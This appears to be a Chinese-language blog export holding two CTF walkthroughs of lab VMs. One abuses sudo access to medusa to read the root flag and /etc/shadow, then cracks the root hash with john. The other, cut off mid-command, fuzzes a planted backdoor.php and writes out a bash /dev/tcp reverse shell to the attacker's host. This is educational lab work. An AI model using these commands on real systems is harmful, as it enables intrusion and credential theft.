Y25oeWs6YmNmODI5NjI3ZWVhMzY0YTNhYmM0MWE2NTM3ZmJmNTQzZTk3NGZmOA==\n\n\n\nbase64\u89e3\u4e00\u4e0b\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ echo 'Y25oeWs6YmNmODI5NjI3ZWVhMzY0YTNhYmM0MWE2NTM3ZmJmNTQzZTk3NGZmOA==' |base64 -d\ncnhyk:bcf829627eea364a3abc41a6537fbf543e974ff8                                  \n```\n\n\u767b\u5f55\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ ssh cnhyk@192.168.205.167           \nThe authenticity of host '192.168.205.167 (192.168.205.167)' can't be established.\nED25519 key fingerprint is SHA256:O2iH79i8PgOwV/Kp8ekTYyGMG8iHT+YlWuYC85SbWSQ.\nThis host key is known by the following other names/addresses:\n    ~/.ssh/known_hosts:4: [hashed name]\n    ~/.ssh/known_hosts:6: [hashed name]\n    ~/.ssh/known_hosts:7: [hashed name]\n    ~/.ssh/known_hosts:12: [hashed name]\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '192.168.205.167' (ED25519) to the list of known hosts.\ncnhyk@192.168.205.167's password: \nLinux Basic 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\ncnhyk@Basic:~$ id\nuid=1000(cnhyk) gid=1000(cnhyk) groups=1000(cnhyk)\ncnhyk@Basic:~$ sudo -l\n\nWe trust you have received the usual lecture from the local System\nAdministrator. It usually boils down to these three things:\n\n    #1) Respect the privacy of others.\n    #2) Think before you type.\n    #3) With great power comes great responsibility.\n\n[sudo] password for cnhyk: \nSorry, user cnhyk may not run sudo on Basic.\n```\n\n\u627e\u63d0\u6743\u70b9\n\n```\ncnhyk@Basic:~$ cat user.txt \nflag{user-df31759540dc28f75a20f443a19b1148}\ncnhyk@Basic:~$ find / -perm -4000 -type f 2>/dev/null\n/usr/bin/chsh\n/usr/bin/chfn\n/usr/bin/newgrp\n/usr/bin/gpasswd\n/usr/bin/mount\n/usr/bin/su\n/usr/bin/umount\n/usr/bin/pkexec\n/usr/bin/sudo\n/usr/bin/passwd\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/openssh/ssh-keysign\n/usr/libexec/polkit-agent-helper-1\ncnhyk@Basic:~$ ss -tulnp\nNetid               State                Recv-Q               Send-Q                             Local Address:Port                               Peer Address:Port               \nudp                 UNCONN               0                    0                                        0.0.0.0:68                                      0.0.0.0:*                  \ntcp                 LISTEN               0                    128                                      0.0.0.0:22                                      0.0.0.0:*                  \ntcp                 LISTEN               0                    128                                         [::]:22                                         [::]:*                  \ntcp                 LISTEN               0                    128                                            *:80                                            *:*                  \ncnhyk@Basic:~$ cd /opt/\ncnhyk@Basic:/opt$ ls -al\ntotal 28\ndrwxr-xr-x  2 root root  4096 Jul  6 09:21 .\ndrwxr-xr-x 18 root root  4096 Mar 18 20:37 ..\n-rwx--x--x  1 root root 17016 Jul  6 09:21 jojo\ncnhyk@Basic:/opt$ ./jojo \n\u95ee\u9898 1: \u8bf7\u8f93\u5165 80+87\n80+87\n\u6b63\u786e\uff01\n\u95ee\u9898 2: \u8bf7\u8f93\u5165 57+91\n^C\n```\n\n\u6211\u613f\u79f0\u4e4b\u4e3a\u4f2a\u4eba\u6d4b\u8bd5\uff0c\u54c8\u54c8\u54c8\uff08\u7eaf\u5f00\u73a9\u7b11\uff0c\u6ca1\u6709\u5192\u72af\u7684\u610f\u601d\uff09\n\n```\ncnhyk@Basic:/tmp$ cat a.py \ncat a.py \n#!/usr/bin/env python3\nimport subprocess\nimport sys\n\nJOJO_EXECUTABLE = '/opt/jojo'\n\ndef slv():\n    print(f'[+] \u6b63\u5728\u542f\u52a8\u76ee\u6807\u7a0b\u5e8f: {JOJO_EXECUTABLE}')\n\n    try:\n        cmd = ['stdbuf', '-oL', JOJO_EXECUTABLE]\n        p = subprocess.Popen(\n            cmd,\n            stdin=subprocess.PIPE,\n            stdout=subprocess.PIPE,\n            stderr=subprocess.STDOUT,\n            text=True,\n            bufsize=1\n        )\n    except FileNotFoundError:\n        print(f'[!] \u9519\u8bef\uff1a\u627e\u4e0d\u5230\u7a0b\u5e8f '{JOJO_EXECUTABLE}' \u6216 'stdbuf'\u3002\u8bf7\u68c0\u67e5\u3002')\n        sys.exit(1)\n\n    print('[+] \u8fde\u63a5\u6210\u529f\uff01\u5f00\u59cb\u81ea\u52a8\u5316\u4ea4\u4e92...\\n')\n\n    while True:\n        l = p.stdout.readline()\n        if not l:\n            break\n        print(l.strip())\n\n        if '\u8bf7\u8f93\u5165' in l:\n            try:\n                q = l.split('\u8bf7\u8f93\u5165 ')[1].strip()\n                ans = q\n                print(f'[*] \u68c0\u6d4b\u5230\u95ee\u9898\uff0c\u63d0\u53d6\u5185\u5bb9: {ans}')\n                print(f'[*] \u81ea\u52a8\u8f93\u5165: {ans}')\n                p.stdin.write(ans + '\\n')\n                p.stdin.flush()\n                print('-' * 20)\n            except IndexError:\n                print('[!] \u8b66\u544a\uff1a\u65e0\u6cd5\u4ece\u884c\u4e2d\u89e3\u6790\u95ee\u9898\u3002')\n\n    p.wait()\n    print(f'\\n[+] \u4ea4\u4e92\u7ed3\u675f\u3002\u7a0b\u5e8f\u9000\u51fa\uff0c\u8fd4\u56de\u7801: {p.returncode}')\n\nif __name__ == '__main__':\n    slv()\n```\n\n\u6267\u884c\n\n```\ncnhyk@Basic:/tmp$ python3 $_\npython3 $_\n[+] \u6b63\u5728\u542f\u52a8\u76ee\u6807\u7a0b\u5e8f: /opt/jojo\n[+] \u8fde\u63a5\u6210\u529f\uff01\u5f00\u59cb\u81ea\u52a8\u5316\u4ea4\u4e92...\n\n\u95ee\u9898 1: \u8bf7\u8f93\u5165 61+34\n[*] \u68c0\u6d4b\u5230\u95ee\u9898\uff0c\u63d0\u53d6\u5185\u5bb9: 61+34\n[*] \u81ea\u52a8\u8f93\u5165: 61+34\n--------------------\n\u7701\u7565\n--------------------\n\u6b63\u786e\uff01\n\u95ee\u9898 500: \u8bf7\u8f93\u5165 95+68\n[*] \u68c0\u6d4b\u5230\u95ee\u9898\uff0c\u63d0\u53d6\u5185\u5bb9: 95+68\n[*] \u81ea\u52a8\u8f93\u5165: 95+68\n--------------------\n\u6b63\u786e\uff01\njojo:jojo\n\n[+] \u4ea4\u4e92\u7ed3\u675f\u3002\u7a0b\u5e8f\u9000\u51fa\uff0c\u8fd4\u56de\u7801: 0\n```\n\njojo:jojo\uff0c\u554a\u8fd9\u6240\u4ee5\u6211\u4e00\u5f00\u59cb\u6d4b\u8bd5\u5f31\u5bc6\u7801\u5c31\u4e0d\u7528\u5199\u4ee3\u7801\u4e86......\n\n```\njojo@Basic:/tmp$ id\nuid=1001(jojo) gid=1001(jojo) groups=1001(jojo)\njojo@Basic:/tmp$ sudo -l\nMatching Defaults entries for jojo on Basic:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser jojo may run the following commands on Basic:\n    (ALL) NOPASSWD: /usr/bin/medusa\n```\n\n\u663e\u800c\u6613\u89c1\u4e86\uff0c\u8fd9\u662f\u4e00\u4e2a\u5bc6\u7801\u7206\u7834\u5de5\u5177\uff0c\u6240\u4ee5\u5b83\u8bfb\u53d6\u5b57\u5178\u5927\u6982\u662f\u6709\u95ee\u9898\u7684\n\n```\njojo@Basic:/tmp$ sudo /usr/bin/medusa --help\nMedusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>\n\n/usr/bin/medusa: invalid option -- '-'\nCRITICAL: Unknown error processing command-line options.\nALERT: User logon information must be supplied.\n\nSyntax: Medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPT]\n  -h [TEXT]    : Target hostname or IP address\n  -H [FILE]    : File containing target hostnames or IP addresses\n  -u [TEXT]    : Username to test\n  -U [FILE]    : File containing usernames to test\n  -p [TEXT]    : Password to test\n  -P [FILE]    : File containing passwords to test\n  -C [FILE]    : File containing combo entries. See README for more information.\n  -O [FILE]    : File to append log information to\n  -e [n/s/ns]  : Additional password checks ([n] No Password, [s] Password = Username)\n  -M [TEXT]    : Name of the module to execute (without the .mod extension)\n  -m [TEXT]    : Parameter to pass to the module. This can be passed multiple times with a\n                 different parameter each time and they will all be sent to the module (i.e.\n                 -m Param1 -m Param2, etc.)\n  -d           : Dump all known modules\n  -n [NUM]     : Use for non-default TCP port number\n  -s           : Enable SSL\n  -g [NUM]     : Give up after trying to connect for NUM seconds (default 3)\n  -r [NUM]     : Sleep NUM seconds between retry attempts (default 3)\n  -R [NUM]     : Attempt NUM retries before giving up. The total number of attempts will be NUM + 1.\n  -c [NUM]     : Time to wait in usec to verify socket is available (default 500 usec).\n  -t [NUM]     : Total number of logins to be tested concurrently\n  -T [NUM]     : Total number of hosts to be tested concurrently\n  -L           : Parallelize logins using one username per thread. The default is to process \n                 the entire username before proceeding.\n  -f           : Stop scanning host after first valid username/password found.\n  -F           : Stop audit after first valid username/password found on any host.\n  -b           : Suppress startup banner\n  -q           : Display module's usage information\n  -v [NUM]     : Verbose level [0 - 6 (more)]\n  -w [NUM]     : Error debug level [0 - 10 (more)]\n  -V           : Display version\n  -Z [TEXT]    : Resume scan based on map of previous scan\n```\n\n\u5229\u7528\n\n```\njojo@Basic:/tmp$ sudo /usr/bin/medusa -u root -h 127.0.0.1 -M ssh -P /root/root.txt -v 64\nMedusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>\n\nGENERAL: Parallel Hosts: 1 Parallel Logins: 1\nGENERAL: Total Hosts: 1 \nGENERAL: Total Users: 1\nGENERAL: Total Passwords: 1\nACCOUNT CHECK: [ssh] Host: 127.0.0.1 (1 of 1, 0 complete) User: root (1 of 1, 0 complete) Password: flag{root-c065860911bb44a2483c096cbd203df9} (1 of 1 complete)\nGENERAL: Medusa has finished.\njojo@Basic:/tmp$ sudo /usr/bin/medusa -u root -h 127.0.0.1 -M ssh -P /etc/shadow -v 64\nMedusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>\n\nGENERAL: Parallel Hosts: 1 Parallel Logins: 1\nGENERAL: Total Hosts: 1 \nGENERAL: Total Users: 1\nGENERAL: Total Passwords: 27\nACCOUNT CHECK: [ssh] Host: 127.0.0.1 (1 of 1, 0 complete) User: root (1 of 1, 0 complete) Password: root:$6$sshVeDa7z638dY8S$ZrwHy6TQ8VMkgSx1mGhCPG8Lffedn9LbDPcgCoQdF877zeXPR.NGhm20RlipL5s0HfPQByfwXyVXnM1giQ9tX0:20275:0:99999:7::: (1 of 27 complete)\n^CALERT: Medusa received SIGINT - Sending notification to login threads that we are are aborting.\nACCOUNT CHECK: [ssh] Host: 127.0.0.1 (1 of 1, 0 complete) User: root (1 of 1, 0 complete) Password: daemon:*:20166:0:99999:7::: (2 of 27 complete)\nALERT: To resume scan, add the following to your original command: '-Z h1u1.'\n```\n\n\u7206\u7834hash\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ john --wordlist=/usr/share/wordlists/rockyou.txt hash                                                                         \nUsing default input encoding: UTF-8\nLoaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 512/512 AVX512BW 8x])\nCost 1 (iteration count) is 5000 for all loaded hashes\nWill run 8 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nbudayday         (root)     \n1g 0:00:00:36 DONE (2025-07-07 11:16) 0.02707g/s 27110p/s 27110c/s 27110C/s buldogs..brittany_\nUse the '--show' option to display all of the cracked passwords reliably\nSession completed. \n```\n\n\u6240\u4ee5\u8bf4\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ grep -w -n 'budayday' /usr/share/wordlists/rockyou.txt                                                                                                \n999993:budayday\n                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ echo 'budayday' > pass                                                                                                        \n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ ssh root@192.168.205.167                                       \nroot@192.168.205.167's password: \nLinux Basic 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Sun Jul  6 08:23:47 2025 from 192.168.3.94\nroot@Basic:~# id\nuid=0(root) gid=0(root) groups=0(root)\n```\n\n\u4f60\u786c\u8dd1\u5e94\u8be5\u8dd1\u7684\u51fa\u6765\uff0c\u6211\u6d45\u8dd1\u4e86500\u884c\u6ca1\u6709\u9650\u5236\n\nsentence", "top": 0, "createdAt": 1751901927, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-07-07", "dateLabelColor": "#0969da"}, "P136": {"htmlDir": "docs/post/nei-bu-_Backdoor1.html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u5185\u90e8_Backdoor1", "postUrl": "post/nei-bu-_Backdoor1.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/136", "commentNum": 0, "wordCount": 35838, "description": "![image-20250709215624782](https://7r1umphk.github.io/image/20250709215633404.webp)\n\n\u6253\u4e00\u4e2a\u7761\u89c9\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sudo arp-scan -l           \n[sudo] kali \u7684\u5bc6\u7801\uff1a\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.205.1   00:50:56:c0:00:08       VMware, Inc.\n192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.\n192.168.205.172 08:00:27:56:2e:31       PCS Systemtechnik GmbH\n192.168.205.254 00:50:56:fa:75:ed       VMware, Inc.\n\n5 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.10.0: 256 hosts scanned in 1.947 seconds (131.48 hosts/sec). 4 responded\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nmap -p- 192.168.205.172     \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-09 09:57 EDT\nNmap scan report for 192.168.205.172\nHost is up (0.00017s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:56:2E:31 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 1.25 seconds\n                                                          \n```\n\n\u90a3\u76f4\u63a5\u770bweb\n\n![image-20250709215805803](https://7r1umphk.github.io/image/20250709215806158.webp)\n\n\u75af\u72c2\u6697\u793a\u540e\u95e8\uff0c\u54c8\u54c8\u54c8\n\n\u626b\u4e00\u4e0b\u76ee\u5f55\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ gobuster dir -u http://192.168.205.172 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.205.172\n[+] Method:                  GET\n[+] Threads:                 64\n[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,txt,html,zip\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/.php                 (Status: 403) [Size: 280]\n/.html                (Status: 403) [Size: 280]\n/index.html           (Status: 200) [Size: 12033]\n/backdoor.php         (Status: 200) [Size: 0]\nProgress: 49295 / 1102800 (4.47%)^C\n[!] Keyboard interrupt detected, terminating.\nProgress: 50573 / 1102800 (4.59%)\n===============================================================\nFinished\n===============================================================\n                       \n```\n\n/backdoor.php\u554a\u8fd9......\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl 'http://192.168.205.172/backdoor.php' -v\n*   Trying 192.168.205.172:80...\n* Connected to 192.168.205.172 (192.168.205.172) port 80\n* using HTTP/1.x\n> GET /backdoor.php HTTP/1.1\n> Host: 192.168.205.172\n> User-Agent: curl/8.14.1\n> Accept: */*\n> \n* Request completely sent off\n< HTTP/1.1 200 OK\n< Date: Wed, 09 Jul 2025 13:59:12 GMT\n< Server: Apache/2.4.62 (Debian)\n< Content-Length: 0\n< Content-Type: text/html; charset=UTF-8\n< \n* Connection #0 to host 192.168.205.172 left intact\n                                            \n```\n\n\u6ca1\u4e1c\u897f\uff0c\u5e94\u8be5\u662f\u9700\u8981\u70b9\u53c2\u6570\uff0c\u7206\u7834\u4e00\u4e0b\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ ffuf -u 'http://192.168.205.172/backdoor.php?FUZZ=id' -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  --fw 1\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://192.168.205.172/backdoor.php?FUZZ=id\n :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n :: Filter           : Response words: 1\n________________________________________________\n\npassword                [Status: 200, Size: 10, Words: 3, Lines: 1, Duration: 3ms]\ncmd                     [Status: 200, Size: 15, Words: 3, Lines: 1, Duration: 0ms]\n[WARN] Caught keyboard interrupt (Ctrl-C)\n\n```\n\n\u4e24\u4e2a\u53c2\u6570\uff0cpassword\uff0c\u6211\u4eec\u4e5f\u4e0d\u77e5\u9053\uff0c\u76f4\u63a5\u7206\u7834\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ ffuf -u 'http://192.168.205.172/backdoor.php?cmd=id&password=FUZZ' -w /usr/share/wordlists/rockyou.txt   --fw 2                 \n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://192.168.205.172/backdoor.php?cmd=id&password=FUZZ\n :: Wordlist         : FUZZ: /usr/share/wordlists/rockyou.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n :: Filter           : Response words: 2\n________________________________________________\n\niloveyou                [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 45ms]\n[WARN] Caught keyboard interrupt (Ctrl-C)\n```\n\n`Gmeek-html<iframe src='//player.bilibili.com/player.html?isOutside=true&aid=113575678971704&bvid=BV19Bz4YuEi2&cid=27120961338&p=1&autoplay=0' scrolling='no' border='0' frameborder='no' framespacing='0' allowfullscreen='true' width='100%' height='460px'></iframe>`\n\n\u8d2b\u4e00\u4e0b\uff0c\u54c8\u54c8\u54c8\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl 'http://192.168.205.172/backdoor.php?cmd=id&password=iloveyou' -v\n*   Trying 192.168.205.172:80...\n* Connected to 192.168.205.172 (192.168.205.172) port 80\n* using HTTP/1.x\n> GET /backdoor.php?cmd=id&password=iloveyou HTTP/1.1\n> Host: 192.168.205.172\n> User-Agent: curl/8.14.1\n> Accept: */*\n> \n* Request completely sent off\n< HTTP/1.1 200 OK\n< Date: Wed, 09 Jul 2025 14:03:13 GMT\n< Server: Apache/2.4.62 (Debian)\n< Content-Length: 0\n< Content-Type: text/html; charset=UTF-8\n< \n* Connection #0 to host 192.168.205.172 left intact\n                    \n```\n\n\u6ca1\u663e\u793a\uff0ctcpdump\u770b\u770b\uff0c\u5efa\u8bae\u76f4\u63a5\u5728\u6d4f\u89c8\u5668\u8bbf\u95ee\n\nkali\u76d1\u542c\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo tcpdump -A -n icmp\n[sudo] kali \u7684\u5bc6\u7801\uff1a\ntcpdump: verbose output suppressed, use -v[v]... for full protocol decode\nlistening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes\n```\n\n![image-20250709220501352](https://7r1umphk.github.io/image/20250709220501561.webp)\n\n\u53d1\u5305\u5361\u4e86\u4e00\u4f1a\uff0c\u770b\u4e00\u4e0b\u76d1\u542c\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo tcpdump -A -n icmp\n[sudo] kali \u7684\u5bc6\u7801\uff1a\ntcpdump: verbose output suppressed, use -v[v]... for full protocol decode\nlistening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes\n10:04:53.658512 IP 192.168.205.172 > 192.168.205.128: ICMP echo request, id 620, seq 1, length 64\nE..TaQ@.@.............e..l...wnh....SR\n..................... !'#$%&'()*+,-./01234567\n10:04:53.658530 IP 192.168.205.128 > 192.168.205.172: ICMP echo reply, id 620, seq 1, length 64\nE..T.j..@./...........m..l...wnh....SR\n..................... !'#$%&'()*+,-./01234567\n10:04:54.688807 IP 192.168.205.172 > 192.168.205.128: ICMP echo request, id 620, seq 2, length 64\nE..TbL@.@................l...wnh......\n..................... !'#$%&'()*+,-./01234567\n10:04:54.688827 IP 192.168.205.128 > 192.168.205.172: ICMP echo reply, id 620, seq 2, length 64\nE..T....@./y.............l...wnh......\n..................... !'#$%&'()*+,-./01234567\n```\n\nok\uff0c\u6ca1\u6709\u95ee\u9898\uff0c\u8fd9\u8fb9\u6211\u5f39shell\u76f4\u63a5\u8bbf\u95eereverce.sh\u4e86\uff0c\u56e0\u4e3a\u8fd9\u4e2a\u9776\u673a\u7684\u6a21\u677f\u9ed8\u8ba4\u5c31\u53ea\u8981busybox\uff0c\u6211\u61d2\u7684\u7a33\u56fa\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ cat reverse.sh                                                                             \nbash -c '/bin/bash -i >& /dev/tcp/192.168.205.128/8888 0>&1'\n              \n```\n\n\u7136\u540e\u5f00\u4e2aweb\u670d\u52a1\u5c31\u597d\u4e86\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ python3 -m http.server 80\nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n```\n\nkali\u76d1\u542c\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nc -lnvp 8888           \nlistening on [any] 8888 ...\n\n```\n\nweb\u8bbf\u95ee\n\n![image-20250709220710494](https://7r1umphk.github.io/image/20250709220710601.webp)\n\n\u4e00\u76f4\u5728\u8f6c\u5708\u5708\u5c31\u5bf9\u4e86\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nc -lnvp 8888           \nlistening on [any] 8888 ...\nconnect to [192.168.205.128] from (UNKNOWN) [192.168.205.172] 53922\nbash: cannot set terminal process group (420): Inappropriate ioctl for device\nbash: no job control in this shell\nwww-data@Backdoor1:/var/www/html$ id\nid\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\nwww-data@Backdoor1:/var/www/html$ ls -al\nls -al\ntotal 24\ndrwxr-xr-x 2 root root  4096 Jul  8 09:26 .\ndrwxr-xr-x 3 root root  4096 Apr  4 23:20 ..\n-rw-r--r-- 1 root root   310 Jul  8 09:25 backdoor.php\n-rw-r--r-- 1 root root 12033 Jul  8 09:26 index.html\nwww-data@Backdoor1:/var/www/html$ cd /home\ncd /home\nwww-data@Backdoor1:/home$ ls -al\nls -al\ntotal 12\ndrwxr-xr-x  3 root  root  4096 Jul  8 09:12 .\ndrwxr-xr-x 18 root  root  4096 Mar 18 20:37 ..\ndrwx------  2 morri morri 4096 Jul  8 09:13 morri\n```\n\n\u4e0d\u7ed9\u8bbf\u95ee\uff0c\u90a3\u5c31\u8bd5\u8bd5\u5f31\u5bc6\u7801\u5427\uff0c\u6700\u8fd1\u5f88\u559c\u6b22\u51fa\u5f31\u5bc6\u7801\n\n```\nwww-data@Backdoor1:/home$ su morri\nsu morri\nPassword: morri\nid\nuid=1000(morri) gid=1000(morri) groups=1000(morri)\n```\n\n\u4e00\u53d1\u5165\u9b42\n\n\u7a33\u56fa\n\n```\nscript /dev/null -c bash\nCtrl+Z\nstty raw -echo; fg\nreset xterm  \nexport TERM=xterm  \nexport SHELL=/bin/bash  \nstty rows 24 columns 80\n```\n\n\u6252\u62c9\n\n```\nmorri@Backdoor1:/home$ cd morri/\nmorri@Backdoor1:~$ ls -al\ntotal 24\ndrwx------ 2 morri morri 4096 Jul  8 09:13 .\ndrwxr-xr-x 3 root  root  4096 Jul  8 09:12 ..\n-rw-r--r-- 1 morri morri  220 Jul  8 09:12 .bash_logout\n-rw-r--r-- 1 morri morri 3526 Jul  8 09:12 .bashrc\n-rw-r--r-- 1 morri morri  807 Jul  8 09:12 .profile\n-rw-r--r-- 1 root  root    44 Jul  8 09:13 user.txt\nmorri@Backdoor1:~$ cat user.txt \nflag{user-4645258dd0f71f7f430bb4f3c37748e6}\nmorri@Backdoor1:~$ sudo -l\n\nWe trust you have received the usual lecture from the local System\nAdministrator. It usually boils down to these three things:\n\n    #1) Respect the privacy of others.\n    #2) Think before you type.\n    #3) With great power comes great responsibility.\n\n[sudo] password for morri: \nSorry, user morri may not run sudo on Backdoor1.\nmorri@Backdoor1:~$ find / -perm -4000 -type f 2>/dev/null\n/usr/bin/chsh\n/usr/bin/chfn\n/usr/bin/newgrp\n/usr/bin/gpasswd\n/usr/bin/mount\n/usr/bin/su\n/usr/bin/umount\n/usr/bin/pkexec\n/usr/bin/sudo\n/usr/bin/passwd\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/openssh/ssh-keysign\n/usr/libexec/polkit-agent-helper-1\nmorri@Backdoor1:~$ ss -tulnp\nNetid   State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port   \nudp     UNCONN   0        0                0.0.0.0:68            0.0.0.0:*      \ntcp     LISTEN   0        128              0.0.0.0:22            0.0.0.0:*      \ntcp     LISTEN   0        128                 [::]:22               [::]:*      \ntcp     LISTEN   0        128                    *:80                  *:*      \nmorri@Backdoor1:~$ cd /opt/\nmorri@Backdoor1:/opt$ ls -al\ntotal 8\ndrwxr-xr-x  2 root root 4096 Apr  1 08:59 .\ndrwxr-xr-x 18 root root 4096 Mar 18 20:37 ..\nmorri@Backdoor1:/opt$ ls /mnt/\nmorri@Backdoor1:/opt$ ls -la /mnt/\ntotal 8\ndrwxr-xr-x  2 root root 4096 Mar 18 20:26 .\ndrwxr-xr-x 18 root root 4096 Mar 18 20:37 ..\nmorri@Backdoor1:/opt$ ls -la /tmp/\ntotal 8\n```\n\n\u4ec0\u4e48\u90fd\u6ca1\u6709\uff0c\u6309\u65f6\u95f4\u6252\u62c9\u4e00\u4e0b\u6587\u4ef6\n\n```\nmorri@Backdoor1:/opt$ find / -type f -newermt '2025-07-05' ! -newermt '2025-07-10' ! -path '/proc/*' ! -path '/sys/*' ! -path '/run/*' 